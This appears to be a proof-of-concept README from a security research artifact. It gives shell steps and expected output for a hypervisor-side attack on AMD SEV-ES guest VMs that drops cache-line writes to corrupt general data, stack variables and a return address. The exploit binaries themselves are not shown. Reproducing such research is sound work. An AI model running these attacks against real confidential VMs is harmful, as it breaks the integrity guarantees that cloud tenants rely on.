## PoCs

### 1. Drop generic writes

```bash
# hv> stands for command executed on the hypervisor; vm> stands for command executed on the guest VM 
# Launch VM (pinned to core 7)
hv> cd AMDSEV
hv> sudo taskset -c 7 ./launch-qemu.sh -hda ./focal.qcow2 -cdrom ./ubuntu-20.04.5-desktop-amd64.iso -vnc 1 -console serial -sev-es

# Login using the password 'ubuntu'
vm> sudo su
vm> apt update && apt -y install git vim build-essential

# enable a hugepage for illustration, 225 is the target index
vm> sysctl -w vm.nr_hugepages=1

# First, you need to copy the file generic-writes-drop.c from the initial archive to the VM.
vm> gcc generic-writes-drop.c -O2 -o generic-writes-drop

# Run
vm> ./generic-writes-drop 0

# Before it ends, run exploit in another terminal
sudo ./blind <APIC Interval> <Number of non-zero steps> <L2 target index>
```

If it takes too long or you think the APIC_Interval is too small which only leads to zero-steps, you can just break it via `ctrl+c` and clean up the shared page (the one for synchronization) by `sudo ./blind <> <> <> 1` .

If the L2 sets index is within 1~1024 then the single specified L2 set will be dropped.

Otherwise you can use 0xAAABBB for <L2 target index> to drop L2 sets whose index are within 0xAAA ~ 0xBBB

Note that, if given a wrong index, we will not see the drops. 
Because the target will be already evicted from the cache to memory. 
``` bash
hv> sudo ./blind 70 100 225

## Expected Output (in the VM)
phys: 0x43c00000
phys: 0x43c03840
result: 39999998815 (similar, i.e., not 40000000000)
```



### 2. Drop stack memory

```bash
vm> gcc math.c -o math

# Run
vm> ./math

# Run the exploit in another terminal
# This time we iteratively drop each index
hv> sudo ./invd.sh

# You will see a value with the correct index for stackframe 
# Then rerun the exploit (with the target index) multiple times to see passing parameters, the initializtion of local variables, and the assignment of local variables can all be dropped.
```


### 3. Reuse return value 

(Drop return address of the `call` instruction) 

```bash
vm> gcc timewarp.c -o timewarp

# Run
vm> ./timewarp

# Change the INTERVAL to a smaller one for single-stepping, e.g., 39. (See paper Table 1)
# Run the exploit in another terminal
hv> sudo ./invd.sh

# Expected Output (in the VM)
"Win!"
```
